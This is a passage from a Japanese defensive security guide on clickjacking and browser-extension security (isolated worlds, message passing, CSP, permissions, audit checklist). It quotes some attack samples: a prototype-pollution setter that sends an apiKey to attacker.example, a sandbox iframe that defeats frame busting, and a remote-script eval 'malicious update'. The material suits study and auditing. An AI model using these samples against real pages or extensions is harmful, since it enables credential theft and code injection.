Clickjackingは単独の脅威にとどまらず、**他の脆弱性と組み合わせて増幅される**点にも注意が必要である。例えば標的ページにDOM based XSSが存在する場合、そのXSSを発火させるURLをiframeのsrcとして読み込ませ、ユーザーのクリックをトリガーにしてペイロードを実行させる、という組み合わせ攻撃が成立し得る。この場合、Clickjacking自体の被害（意図しない操作の実行）に加えて、XSSによる任意コード実行という、より深刻な影響が重なることになる。

> 出典: Clickjacking — https://portswigger.net/web-security/clickjacking

### フレームバスティングとその回避

古典的なクライアントサイド対策として、**フレームバスティング(frame busting)**と呼ばれるJavaScriptによる自衛スクリプトがページ自身に埋め込まれることがあった。典型的には、「自分のウィンドウがトップレベルのウィンドウであるか」を確認し、もしiframe内に置かれていると判定した場合は強制的にトップへ移動する、あるいは操作をブロックするといったロジックである。

しかしこの防御はJavaScriptの実行に依存するため、攻撃者側から容易に無力化される。代表的な回避手法が、iframeに`sandbox`属性を付与する方法である。

```html
<iframe src="https://victim-site.example/" sandbox="allow-forms"></iframe>
```

`sandbox`属性を持つiframeには、指定したトークン（ここでは`allow-forms`）で許可された機能のみが与えられる。仕組みとして重要なのは、`allow-forms`や`allow-scripts`を指定していても**`allow-top-navigation`を指定しなければ、iframe内のスクリプトはトップレベルウィンドウのナビゲーションを実行する権限を持たない**という点である。フレームバスティングスクリプトは通常「自分がトップウィンドウかどうかを判定し、そうでなければトップへ強制遷移する」ロジックに依存しているため、この遷移操作自体が`sandbox`によって権限剥奪されると、スクリプトが検知・実行ロジックを走らせようとしても実質的に無力化されてしまう。これは「クライアントサイドの自衛策は、ブラウザが提供するサンドボックス機構によって覆される可能性が常にある」という一般原則の好例である。

このように、フレームバスティングは**ブラウザのJavaScript実行環境・セキュリティ設定に依存する不安定な対策**であり、単独の防御としては信頼できない。

> 出典: Clickjacking — https://portswigger.net/web-security/clickjacking

### サーバーサイドの正式な防御: X-Frame-OptionsとCSP frame-ancestors

Clickjackingに対する本質的な対策は、**サーバー側からブラウザに対して「このページは他のサイトにフレーム化されることを許可しない」と明示的に指示する**ことである。

#### X-Frame-Options

```
X-Frame-Options: deny
X-Frame-Options: sameorigin
X-Frame-Options: allow-from https://trusted.example.com
```

- **`deny`**: いかなるオリジンからのフレーム化も禁止する。
- **`sameorigin`**: 自分自身と同一オリジンからのフレーム化のみを許可する。
- **`allow-from [URI]`**: 指定したオリジンからのフレーム化のみを許可する。ただし、このディレクティブは**ブラウザ間の実装が一貫しておらず**、Chrome 76以降やSafari 12以降では`allow-from`自体がサポートされていない。したがって現在の実務では信頼して使うことができない。

#### Content-Security-Policy: frame-ancestors

より新しく、かつ現在推奨されるのがCSPの`frame-ancestors`ディレクティブである。

```
Content-Security-Policy: frame-ancestors 'self';
```

- **`frame-ancestors 'none'`**: `X-Frame-Options: deny`と等価で、いかなるフレーム化も禁止する。
- **`frame-ancestors 'self'`**: 同一オリジンからのフレーム化のみを許可する。
- **`frame-ancestors <domain>`**: 特定ドメインを明示的に許可リスト化できる。

`frame-ancestors`は複数オリジンの列挙や、より柔軟なポリシー記述に対応しており、`allow-from`のようなブラウザ間の非互換問題を抱えていないため、現在の防御実装では**`X-Frame-Options`と`Content-Security-Policy: frame-ancestors`を併用し、CSP側を主、X-Frame-Optionsを古いブラウザ向けのフォールバックとして扱う**のが実務上の定石である。

### 検査ツールとしてのClickbandit

診断・検証作業を効率化するツールとして、Clickbanditのようなプルーフオブコンセプト自動生成ツールが挙げられる。テスターが意図する一連のクリック操作を実際にブラウザ上で記録させると、それに対応するオーバーレイHTML/CSSを自動生成する。これにより、手作業でCSSの座標調整やz-index設計を行うことなく、脆弱性の再現性を迅速に確認できる。

> 出典: Clickjacking — https://portswigger.net/web-security/clickjacking

### まとめ: 両者に共通する視点

WebSocketハイジャックとClickjackingは、実装レイヤーは全く異なるものの、**「ブラウザが持つ暗黙の信頼（オリジン単位のCookie自動送信、iframeの表示継承）を悪用し、サーバー側・アプリケーション側が明示的に検証・制限していない部分を突く」**という共通の攻撃思想を持つ。防御においても、

- WebSocketハンドシェイクは通常のHTTPリクエストと同じ扱いで`Origin`検証・CSRFトークンを組み込む
- WebSocketメッセージのペイロードは通常のHTTPパラメータと同じ扱いで入力検証・出力エスケープを行う
- ページが他サイトにフレーム化されることを想定していないなら、`Content-Security-Policy: frame-ancestors`で明示的に禁止する
- クライアントサイドのJavaScriptによる自衛（フレームバスティング等）はサーバーサイドの明示的な制御の代替にはならない

という「暗黙の挙動に頼らず、明示的にポリシーを宣言する」という一貫した方針が有効である。この視点は、本章でこれまで扱ってきたDOM based XSSやsink分析の考え方とも地続きであり、クライアントサイド脆弱性ハンティング全体を貫く基盤的な発想であると言える。

（本節は防御目的の技術解説であり、実在サービスや本番環境への無許可の検証・侵害手順を意図するものではない。実際の検証は必ず許可された環境・スコープ内で行うこと。）

## ブラウザ拡張のセキュリティ（content script/isolated world）

Web アプリの脆弱性ハンティングに慣れた人がブラウザ拡張を見ると、最初はただの「JavaScript の詰め合わせ」に見える。しかし拡張は、**Same-Origin Policy（同一オリジンポリシー）の外側に立つ特権コード**であり、ひとつのバグが「特定サイトの XSS」ではなく「全オリジンの読み取り」「Cookie の全取得」「OS コマンド実行」に化ける。本節では、拡張のアーキテクチャと isolated world（分離ワールド）の内部機構を仕組みレベルで押さえ、そこから導かれる脆弱性クラスと防御を体系化する。

前提として本節は**防御・自己資産の監査を目的**とする。解析対象は自分が開発・配布する拡張、あるいは明示的な許可を得た拡張に限る。実在サービスや他人の環境に対する無許可の検証は行わない。

### 拡張のアーキテクチャ：3 つの実行コンテキストと特権の落差

HackTricks の方法論は、拡張を 3 つの構成要素に分けて捉える。

1. **Content Script（コンテンツスクリプト）** — 対象ページに注入され、そのページの DOM に直接アクセスできる。ただし拡張 API はごく一部（`chrome.runtime` の一部、`chrome.storage` など）しか使えない。**低特権・高露出**の層。
2. **Extension Core（拡張コア）** — MV3 では Service Worker（背景スクリプト）、およびポップアップ／オプションページ等の拡張ページ。`chrome-extension://<id>/` オリジンで動き、マニフェストで宣言した権限（タブ、Cookie、ネットワーク、ホスト権限）をフルに持つ。**高特権・低露出**の層。
3. **Native Binary（ネイティブバイナリ）** — native messaging 経由で拡張コアと stdin/stdout で会話する OS 上の実行ファイル。**最高特権**（ブラウザのサンドボックスの外）。

この 3 層はそれぞれ別のプロセス／別のサンドボックスに置かれる。セキュリティ上の本質は、**特権が右へ行くほど上がるのに、攻撃者が触れるのは左端だけ**という構造だ。したがって拡張の脆弱性ハンティングとは、ほぼ常に「左から右へのメッセージ経路のどこかで検証が抜けていないか」を探す作業になる。

#### manifest.json：攻撃面の設計図

監査は必ず `manifest.json` から始める。HackTricks が示す骨格は次の通り（MV2 の例だが、フィールドの意味は MV3 でも共通）。

```json
{
  "manifest_version": 2,
  "name": "Extension Name",
  "version": "1.0",
  "permissions": ["storage"],
  "host_permissions": ["https://example.com/*"],
  "content_scripts": [
    {
      "js": ["script.js"],
      "matches": ["https://example.com/*"],
      "run_at": "document_idle"
    }
  ],
  "background": {"scripts": ["background.js"]},
  "web_accessible_resources": [
    {"resources": ["images/*.png"], "matches": ["https://example.com/*"]}
  ],
  "externally_connectable": {
    "matches": ["https://app.example.com/*"]
  }
}
```

読み方のコツは、**各フィールドを「攻撃者が到達できる入口」として数える**ことだ。

- `content_scripts.matches` — どのオリジンのページが、この拡張のコードと同居できるか。`<all_urls>` や `*://*/*` なら、攻撃者が用意した任意のページ上で content script が動く。つまり攻撃者は content script の入力を自由に制御できる。
- `run_at` — `document_start`（DOM 構築前）／`document_end`（DOMContentLoaded 相当）／`document_idle`（既定、ロード完了後の空き時間）。後述するレース条件に効く。
- `externally_connectable.matches` — Web ページから直接 Service Worker へメッセージを投げられるオリジン。ここに載ったオリジンの XSS は、**content script という緩衝材を飛び越えて**高特権層に到達する。
- `web_accessible_resources` — 外部ページから `chrome-extension://<id>/...` で参照できるファイル。拡張の存在検知（フィンガープリンティング）とクリックジャッキングの入口。
- `permissions` / `host_permissions` — MV3 では API 権限（`storage`, `tabs`, `cookies` …）と、アクセス可能なオリジン（`https://*/*` 等）が別フィールドに分離された。被害の上限を決めるのはほぼこの 2 つ。

> 出典: Browser Extension Pentesting Methodology — https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html
> （注: 上記 URL は取得時に有料ゲートウェイへ 302 リダイレクトされ 402 を返したため、同一内容の原本である HackTricks 公式リポジトリの raw Markdown から取得した。）

### isolated world の内部機構 —「分離されている」とは何が分離されているのか

ここが本節の核心である。content script は「ページと同じ DOM を見るが、同じ JavaScript 世界にはいない」。この直感を実装レベルに落とす。

#### 仕組み：ワールドごとの V8 コンテキストと DOM ラッパー

Chromium では、1 つのフレーム（document）に対して複数の **world** が存在できる。main world（ページ自身のスクリプト）と、拡張ごとに 1 つ割り当てられる isolated world である。各 world は**独立した V8 Context**を持つ。V8 Context とは、グローバルオブジェクト（`window`）とすべての組み込みオブジェクト（`Object`, `Array`, `Function`, `Element.prototype` など、いわゆる primordials）の 1 セットを指す。

一方、DOM ツリーそのものは Blink（C++）側のオブジェクトであり、フレームにつき 1 つしかない。JavaScript から DOM を触るときに使う `HTMLDivElement` インスタンスは、この C++ オブジェクトに対する **world ごとの JS ラッパー**だ。したがって：

- **共有されるもの**: DOM ノードの構造・属性値・テキスト、フォームの入力値、`location`、Cookie（`document.cookie`）、発火するイベント。これらは Blink 側の状態なので、どの world から見ても同じ。
- **分離されるもの**: `window` のプロパティ、`Object.prototype` などの組み込みオブジェクトとその改変、DOM ノードに付けた expando（独自プロパティ。例: `el.myData = x`）、関数の再定義。main world で `Element.prototype.innerHTML` の setter を差し替えても、isolated world のラッパーは別の `Element.prototype` を参照しているため**影響を受けない**。

この設計から重要な帰結が 2 つ出る。

**帰結 1: JS レベルの汚染からは守られる。** ページが `Object.defineProperty(Object.prototype, 'apiKey', {...})` のようなプロトタイプ汚染を仕掛けても、isolated world で動く content script のオブジェクトはその setter を踏まない。逆に言えば、**この保護は content script を出た瞬間に消える**（次項の main world 注入）。

**帰結 2: DOM レベルの攻撃からは守られない。** content script が読む DOM の中身は、すべてページ（＝攻撃者）が自由に書ける。具体的には次が効く。

- **DOM clobbering** — `<img name="config">` や `<form id="token">` を置くと、名前付きアクセス（named access）によって `window.config` / `document.token` が DOM 要素を返す。これは Blink の DOM 仕様に基づく挙動であり、**isolated world の `window` でも同じように起きる**。content script が `window.config?.endpoint ?? DEFAULT` のような書き方をしていると、ページ側に値を握られる。
- **偽イベント** — ページは `dispatchEvent(new MouseEvent('click'))` で content script のリスナを呼べる。ユーザ操作と区別するには `event.isTrusted === true` を確認するしかない。
- **属性・テキストの sink 化** — content script が `el.dataset.url` を `chrome.runtime.sendMessage` にそのまま流せば、ページが背景スクリプトのリクエスト先を決められる。

> 補足（sink の定義）: **sink（シンク）** とは、入力が最終的に実行・解釈される危険な代入先を指す。拡張では `innerHTML`, `eval`, `Function()`, `location` 代入に加え、**`chrome.*` API の引数**（特に `scripting.executeScript` のコード、`sendNativeMessage` のペイロード、`fetch` の URL）が最重要の sink になる。

#### 時間軸の罠：document_start でも「最初」ではない

「`document_start` で動けば、ページのスクリプトより先に実行できるから安全」という前提は成立しない。OWASP が明記する通り、Chromium では**新しく生成された iframe のコンテキストを、親ページのスクリプトが拡張スクリプト実行前に細工できる**既知の問題がある（Chromium issue 40202434）。したがって「先に走っているから native な prototype が使えるはず」という設計は避ける。

#### Firefox の違い：Xray vision

Firefox（WebExtensions）では、content script からページのオブジェクトを見るときに **Xray vision** という追加の仕組みが働く。ページ側が `window.JSON.parse` を差し替えていても、content script からは元の native な実装が見える。ページ側の改変込みのオブジェクトに触りたい場合は明示的に `window.wrappedJSObject` を使う必要があり、逆方向にデータを渡すには `cloneInto()` / `exportFunction()` を使う。Chromium にはこの層はなく、world 分離のみで同等の効果を得ている。**クロスブラウザ拡張を監査するときは、Firefox でだけ安全に見えるコードが Chromium では危険になり得る**点に注意する。

### main world への注入と prototype-based data skimming

拡張がページの JS 変数にアクセスしたい、あるいはページ内のフレームワークと連携したい場合、`<script>` タグを DOM に挿入する（src は `web_accessible_resources` に登録した拡張内ファイル）か、Chrome 111 以降であればマニフェストの `content_scripts` に `"world": "MAIN"` を指定する／`chrome.scripting.executeScript({ world: "MAIN" })` を使う。この瞬間、そのコードは**ページと同じ V8 Context に落ちる**。isolated world の保護はゼロになる。

OWASP はこれを「Prototype-based Data Skimming（プロトタイプ経由のデータ抜き取り）」として独立した脆弱性クラスに挙げ、次の実例を示す。

```javascript
// 悪意あるページ側: 全オブジェクトの 'apiKey' setter を乗っ取り、
// 代入された値をそのまま攻撃者サーバへ送る
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// 拡張が main world で実行するスクリプト
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // 'apiKey' の setter は既に汚染済み。
    // この 1 行で悪意あるコードが起動し、値は即座に外部送信される。
    window.apiController.apiKey = data.apiKey;
  }
})
```

なぜ成立するのか。`window.apiController.apiKey = ...` は、まず `apiController` の自身のプロパティを探し、無ければプロトタイプチェーンを辿って setter を探す。`Object.prototype` に setter が定義されていればそれが呼ばれる——これは JavaScript のプロパティ代入セマンティクスそのものであり、バグではない。main world にいる限り、**代入・関数呼び出し・メソッド参照のほぼすべてが攻撃者のフックを通り得る**。

対策として OWASP は次を明示する。

- 機微情報は、たとえ一瞬でもページのコンテキストで扱わない。
- どうしても main world のスクリプトと通信するなら、**非機微な最小限の情報だけ**を渡す（例: トークン本体ではなく「検証結果の真偽値」だけ）。`window.postMessage` も同様で、`postMessage` 自体を差し替えられるし、攻撃者は `message` リスナを追加できる。
- **「汚染されていない native prototype を取り戻す小技」に依存しない。** そうした手法は知られているが、それを迂回する手法（他スクリプトに汚染済み prototype を強制的に使わせる方法）も次々に考案されている。

つまり正しい設計は「main world でも安全に書く」ではなく、**「機微データを main world に持ち込まない」**である。

### DOM-based Data Skimming：画面に出した時点で漏れている

main world にコードを置かなくても、**ページの DOM に機微情報を描画した時点で**ページのスクリプトから読まれる。OWASP の例：

```javascript
// content-script.js
// 拡張の背景サービスから取得した機微データ
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// ページの DOM に直接挿入している（= ページのスクリプトから読める）
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

content script が isolated world にいても、**挿入した要素は共有 DOM の一部**なので `document.querySelector` で普通に読める。React 等のフレームワークでコンポーネントを注入しても同じである。対象は PII、決済情報、AI チャット履歴など。

対策は、拡張が完全に制御する UI 面に出すこと：**ポップアップ**、**オプションページ**、**サイドパネル**（Chromium 用語。Firefox では「サイドバー」）。

注意点として OWASP は、**Shadow DOM は緩和策として不十分**と明言する。`open` な Shadow Root はページから `element.shadowRoot` で辿れる。`closed` であっても、脅威モデルに「他の拡張」を含めるなら安全ではない——拡張は `openOrClosedShadowRoot()` API で closed Shadow DOM を貫通できるからだ。

### メッセージパッシング：信頼境界が壊れる場所

#### ページ → content script（window.postMessage）

HackTricks の推奨する受信側テンプレート：

```javascript
// content script 側のリスナ
window.addEventListener("message", (event) => {
  if (event.source !== window) return // 同一ウィンドウ由来か確認
  if (event.data.type === "FROM_PAGE") {
    chrome.runtime.sendMessage(event.data) // 背景へ転送
  }
}, false)
```

この形は**そのままでは危険**である点を理解しておきたい。`event.source !== window` のチェックは「別フレームからの postMessage」を弾くだけで、**同じページ上の任意のスクリプト（＝攻撃者）は通過する**。content script が `<all_urls>` にマッチしているなら、攻撃者は自分のサイトで同じ postMessage を投げるだけでこの経路に乗れる。HackTricks が併せて挙げる `event.isTrusted`、オリジン（`event.origin`）、`event.source` の検証は最低限であり、根本的には**「ページからのメッセージは常に敵対的入力」として扱い、転送先で厳格に検証する**しかない。

#### content script → Service Worker（chrome.runtime.sendMessage）

```javascript
// content script から送信
const response = await chrome.runtime.sendMessage({greeting: "hello"})

// 背景側で受信・応答
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.greeting === "hello") {
    sendResponse({farewell: "goodbye"})
  }
  return true // sendResponse を非同期で呼ぶ場合に必要
})
```

`return true` はリスナが同期的に終了してもメッセージチャネルを開いたままにする宣言で、これを忘れると非同期応答が届かない（実装上のよくある罠）。双方向・継続的な通信には `chrome.runtime.connect()` によるポートを使う。

OWASP が「Insecure Message Passing」として挙げる典型的な脆弱コードは次の通り。

```javascript
// Service Worker（背景）内
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // 送信元を一切検証していない
    // 悪意あるコンテンツスクリプト／Web ページがこれを起動できてしまう
    fetch(SECRET_API_URL);
  }
});
```

推奨される形：

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

ここは**なぜ 2 つの条件が必要か**が肝である。`sender.id !== chrome.runtime.id` は「他の拡張からのメッセージ」を弾くだけで、**自分の content script は必ずこのチェックを通る**。そして content script は攻撃者のページ上で動いているかもしれない。だから 2 行目で `sender.url` が `chrome-extension://` で始まること、すなわち**送信元が拡張ページ（ポップアップ／オプションページ）であること**を要求している。Chrome 自身が「content script は拡張ページより信頼できない」と明言しており、この区別が設計の中心になる。

実務上のチェック項目（OWASP の Mitigation を実装に落としたもの）：

- `sender.id` を検証して自拡張由来であることを確認する。
- `sender.url` / `sender.origin` を検証し、どの拡張ページ・どのオリジンの content script が話しかけられるかを絞る（content script を許す場合は**オリジンの許可リスト**にする。`sender.tab` の有無で content script か拡張ページかを判別できる）。
- Web ページが content script を介して間接的に特権ロジックを動かせる作りを避ける。
- `request.action` と**すべてのパラメータ**を許可リスト方式で厳密に検証する（URL を受け取るなら文字列一致か、スキーム＋ホストの完全一致で判定する）。

#### 最も影響の大きいプリミティブ：CORS / SOP バイパス読み取り

なぜメッセージハンドラの検証漏れが「中程度」ではなく「重大」なのか。背景スクリプトの `fetch` は**拡張のホスト権限に基づいて実行され、ページの Same-Origin Policy と CORS の制約を受けず、ユーザの Cookie が付く**。したがって `{action:'proxyFetch', url: <任意>}` のようなハンドラが検証なしに存在し、かつ `host_permissions` が `<all_urls>` なら、攻撃者のページは

1. content script（または `externally_connectable`）経由で任意 URL の取得を依頼し、
2. ログイン済みの任意サイトのレスポンス本文を受け取る

ことができる。これは実質的に**全オリジンに対する universal な読み取り**であり、拡張の脆弱性報告で最高評価が付く典型だ。監査では「背景側に汎用 fetch/XHR プロキシがないか」を最優先で探す。

#### externally_connectable：緩衝材を飛ばす近道

`externally_connectable` は、Web ページや他拡張が `chrome.runtime.sendMessage(extensionId, ...)` で直接メッセージを送れる相手を指定する。HackTricks の対比：

```javascript
// 危険: サブドメインをまとめて許可
"matches": ["https://*.example.com/*"]

// 安全: 単一オリジンを明示
"matches": ["https://app.example.com/*"]
```

ワイルドカードが危険な理由は明快で、`*.example.com` のどれか 1 つ——放置されたステージング環境、ユーザ生成コンテンツを置くサブドメイン、買収した古いサービス——に XSS が 1 つあれば、そこから**直接** Service Worker にメッセージを送れる。HackTricks はこれを「XSS が content script の CSP を完全に迂回して背景スクリプトへ到達する」と表現している。サブドメインテイクオーバーとの合わせ技も現実的な脅威だ。

なお、このキーを**宣言しない**場合の既定挙動は「どの Web ページも接続できないが、他の拡張は `onMessageExternal` に到達できる」である（Chrome）。他拡張からのメッセージも拒否したいなら `"externally_connectable": {"ids": []}` のように明示的に閉じる。

> 出典: OWASP Browser Extension Vulnerabilities Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html

### web_accessible_resources：外から見える拡張の窓

`web_accessible_resources`（WAR）に載せたファイルは、外部ページから `chrome-extension://<id>/page.html` のような URL で読み込める。MV3 では対象を絞れる形式になっている。

```json
"web_accessible_resources": [
  {
    "resources": ["injected.js", "ui/panel.html"],
    "matches": ["https://app.example.com/*"],
    "use_dynamic_url": true
  }
]
```

- `matches` — このリソースを参照できるオリジンを限定する（MV2 には無く、全オリジンに公開だった）。
- `extension_ids` — 特定拡張だけに公開する場合に使う。
- `use_dynamic_url`（Chrome 104 頃〜） — URL 中の拡張 ID をセッションごとのランダム値に置き換え、後述のフィンガープリンティングを緩和する。

WAR が生むリスクは 3 つある。

1. **拡張のフィンガープリンティング／存在検知** — 任意サイトが `fetch('chrome-extension://<known-id>/icon.png')` の成否で拡張の有無を判定できる。ID はストア公開拡張では固定値なので総当たり可能。Firefox は `moz-extension://<インストールごとのランダム UUID>` を使うため列挙されにくいが、逆に UUID が漏れると強い追跡子になる。
2. **クリックジャッキング** — WAR に含めた HTML ページ（設定画面、承認ダイアログ等）は外部サイトから iframe に埋め込める。拡張ページの CSP に `frame-ancestors 'none'` を入れて塞ぐ。
3. **拡張ページ上の DOM XSS** — WAR ページが `location.hash` や `postMessage` をそのまま `innerHTML` に流すと、`chrome-extension://` オリジンで XSS が成立する。これは**拡張の全権限を伴う XSS**であり、通常の Web XSS とは比較にならない重大度になる。

また、main world 注入のために `injected.js` を WAR に置くパターンは一般的だが、このスクリプト自体が「ページから読める・解析できるコード」である点を忘れないこと。秘密鍵やエンドポイントの隠蔽には一切ならない。

### 拡張の CSP と MV3 の「遠隔コード禁止」

拡張ページの既定 CSP は厳しく、HackTricks が示す通り `script-src 'self'; object-src 'self';` が基本線である。MV3 ではさらに、`extension_pages` に対して**この既定を緩める方向の変更が許されない**（`unsafe-eval` や外部 CDN の許可は不可。WebAssembly については `wasm-unsafe-eval` が Chrome 103 頃から個別に許可される）。

```json
{
  "manifest_version": 3,
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'; frame-ancestors 'none'"
  }
}
```

MV2 時代は `unsafe-eval` や CDN のホワイトリストが書けたため、「拡張ページに DOM XSS → CDN 上の古い JSONP エンドポイント経由で任意コード実行」という CSP バイパスが成立した。MV3 ではこの経路が構造的に塞がれている。これが MV3 で**遠隔コードのホスティングが禁止**された理由でもある：拡張のコードはストア審査を受けたパッケージ内のものだけ、という不変条件を作ることで、審査後に挙動を差し替える攻撃（後述のサプライチェーン）を封じる狙いがある。

OWASP の「Malicious Updates」はその具体例を示す。

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // 危険
});
```

これは MV3 では CSP により実行できないが、`eval` を使わない変種——外部から取得した**データ**を解釈して振る舞いを変えるインタプリタ的実装——は審査をすり抜けうる。OWASP / Mozilla の指針は明確で、**遠隔スクリプトを注入・同梱しない**、更新はマーケットプレイス経由に限る、取得したコードを実行する前に完全性検証を行う、である。

一点注意すべきなのは、**content script が注入するコードとページの CSP の関係**だ。content script 自身の JS 実行はページの CSP に制限されない（ブラウザが別 world で直接実行するため）。しかし content script が `document.createElement('script')` でページ DOM に `<script src=...>` を挿入した場合、その読み込みは**ページの CSP で評価される**。拡張が「CSP の厳しいサイトでだけ動かない」現象の大半はこれが原因であり、同時に「WAR の URL をページ CSP の `script-src` に許可させよう」とする危険な回避策を誘発する。

### 権限モデルと危険 API

OWASP の第 1 項「Permissions Overreach（権限の過剰要求）」が示す悪い例：

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

`http://*/*` と `https://*/*` は実質 `<all_urls>` であり、全サイトの内容を読み書きできる。対策は最小権限原則（PoLP）に加えて、**`optional_permissions` と `chrome.permissions.request()` による実行時要求**を使い、ユーザ操作の文脈でのみ権限を得る設計にすること。`activeTab` 権限は「ユーザが拡張アイコンをクリックしたタブにだけ、一時的にアクセスする」ための仕組みで、`<all_urls>` の代替として最も有効な選択肢である。

被害の上限を跳ね上げる API（HackTricks の「Dangerous APIs」を実務向けに整理）：

| API / 権限 | 悪用時の帰結 |
| --- | --- |
| `innerHTML` / `eval` / `Function()` | 拡張オリジンでのコード実行（拡張ページなら全権限 XSS） |
| `chrome.tabs.executeScript`（MV2）／`chrome.scripting.executeScript`（MV3） | 任意タブへのコード注入 = Universal XSS |
| `chrome.runtime.sendNativeMessage` | OS 上のバイナリへの入力 = RCE の起点 |
| `chrome.webRequest` / `chrome.declarativeNetRequest` | 通信の改竄・傍受、セキュリティヘッダの剥奪 |
| `cookies` | HttpOnly Cookie を含む全 Cookie の窃取 |
| `debugger` | DevTools プロトコル経由でブラウザを完全掌握 |
| `management` | 他拡張の無効化（セキュリティ拡張の停止） |

監査では「その権限が本当に必要か」だけでなく、**「その権限を握る関数に、外部入力がどう届くか」**を追跡する。権限そのものより、権限を持つ関数への到達経路が脆弱性である。

### Native Messaging：ブラウザの外へ出る経路

```javascript
chrome.runtime.sendNativeMessage(
  "com.company.app",
  {text: "Hello"},
  (response) => console.log(response)
)
```

`nativeMessaging` 権限と、OS 側（レジストリまたは所定のパス）に置かれた native messaging host のマニフェストが必要で、通信は stdin/stdout の長さ接頭辞付き JSON で行われる。HackTricks が指摘する危険パターンは **content script →（検証なし）→ 背景 →（検証なし）→ ネイティブバイナリ**の連鎖だ。ネイティブ側がパスやコマンド文字列を受け取って実行する実装なら、悪意あるページがそのまま OS コマンド実行に到達する。監査では、ネイティブホストのマニフェストの `allowed_origins`（接続を許す拡張 ID）が絞られているか、ネイティブ側が入力を型・値域レベルで検証しているかを必ず見る。

### データ保管とその他の実装上の落とし穴

- **Insecure Storage** — `localStorage.setItem('token', 'my-secret-token')` のような平文保存は避け、`chrome.storage` API を使う。ただし `chrome.storage` も暗号化されているわけではなく、拡張のプロファイル領域に平文で残る点は理解しておく（同じ拡張内の XSS や、ローカルにアクセスできる攻撃者からは守れない）。機微データは保存前に暗号化し、API キーや資格情報をコードにハードコードしない。
- **Data Leakage / Insecure Communication** — `fetch('http://example.com/api/data')` のような平文通信をやめ、送信内容と送信先をプライバシーポリシーで開示し、収集前に同意を取る。OWASP は閲覧 URL をそのまま外部へ POST する `chrome.tabs.onUpdated` リスナの例を挙げており、「拡張がテレメトリと称して全閲覧履歴を送る」実装は実際に多い。
- **Third-Party Dependencies** — 同梱ライブラリは `npm audit` や OWASP Dependency-Check で継続的に監査し、静的解析では Retire.js で既知脆弱バージョンを検出する。拡張は自動更新までユーザ端末に古いコードが残る点で、Web アプリより脆弱ライブラリの寿命が長い。
- **Insufficient Privacy Controls** — データの収集・共有内容を明示し、オプトアウトを提供する（GDPR / CCPA 対応）。

### サプライチェーン：買収・乗っ取り・悪性アップデート

拡張の最大の現実的脅威は、コードの脆弱性ではなく**正規の更新チャネルを通じた悪性コードの配信**である。人気拡張が買収されて広告注入・履歴収集に転じる、開発者のストアアカウントがフィッシングされて悪性版が配信される、といった事例が繰り返されてきた。

HackTricks は、新旧バージョンの差分から高シグナルな変化を拾う監視を推奨する。

- 背景スクリプト／Service Worker の新規追加・変更
- content script の新規追加（特に `matches` の拡大）
- `permissions` / `host_permissions` の追加
- 新規通信先ドメイン（C2 の可能性）
- 変更ファイルのエントロピー異常（難読化・圧縮の兆候）
- 静的解析での検知（base64 デコード、Cookie 収集、難読化パターン）

自動化には Assemblyline の各サービス（Extract、Characterize、JsJAWS、FrankenStrings、URLCreator）が利用できる。企業環境では、許可リスト方式の拡張管理ポリシーと、バージョン固定＋差分レビューの運用が現実解になる。

### 監査の実務：入手・展開・チェックリスト

配布パッケージ（CRX）は公開エンドポイントから取得できる。**自分が権限を持つ拡張、または解析が許諾された拡張に対してのみ**実施すること。

```bash
extension_id=YOUR_ID
curl -L -o "$extension_id.zip" \
  "https://clients2.google.com/service/update2/crx?response=redirect&x=id%3D$extension_id%26uc"
unzip -d "$extension_id-source" "$extension_id.zip"
```

CRX は実体が ZIP（先頭に署名ヘッダが付く）なので、そのまま `unzip` で展開できることが多い。解析補助ツールとしては、マニフェスト解析・WAR 検出・危険関数のフラグ付け・CSP バイパス判定・脆弱ライブラリ検出を行う **Tarnish**、マニフェスト／ローカライズ／JS／HTML から特徴を抽出する Python 製の **Neto**、ブラウザ上でソースを閲覧できる **CRX Viewer**（robwu.nl/crxviewer/）がある。動的解析は `chrome://extensions` を開発者モードにしてパッケージ化されていない拡張として読み込み、Service Worker の DevTools を開いて `chrome.storage` とメッセージの流れを観察する。

最後に、HackTricks の監査チェックリストを本節の内容と対応づけて再掲する。

- [ ] `permissions` / `host_permissions` を最小化する（`<all_urls>` を `activeTab` や `optional_permissions` に置換できないか）
- [ ] 厳格な CSP を設定し、`unsafe-inline` や広すぎる CDN 許可を入れない
- [ ] `externally_connectable` は単一オリジンに限定し、ワイルドカードを避ける
- [ ] `web_accessible_resources` を最小化し、`matches` で公開先を絞り、`frame-ancestors` でクリックジャッキングを防ぐ
- [ ] すべての `postMessage` 受信を検証する（`isTrusted`、オリジン、`source`）— そして転送先でも再検証する
- [ ] `chrome.runtime.onMessage` で `sender.id` と `sender.url`/`origin` を検証し、`action` とパラメータを許可リスト化する
- [ ] 資格情報や鍵を、コード・メモリ・保護されていないファイルに置かない
- [ ] content script → 背景 → ネイティブバイナリの経路を必ずサニタイズする
- [ ] 機微データのクリップボードコピーを避け、必要なら短時間でクリアする
- [ ] Retire.js 等で脆弱な third-party ライブラリを検出する
- [ ] 機微データを**ページの DOM にも main world にも**置かない（ポップアップ／オプションページ／サイドパネルを使う）

### まとめ：本節の設計原則

1. **isolated world は JS の分離であって、DOM の分離ではない。** プロトタイプ汚染からは守られるが、DOM clobbering・偽イベント・属性値の汚染からは守られない。
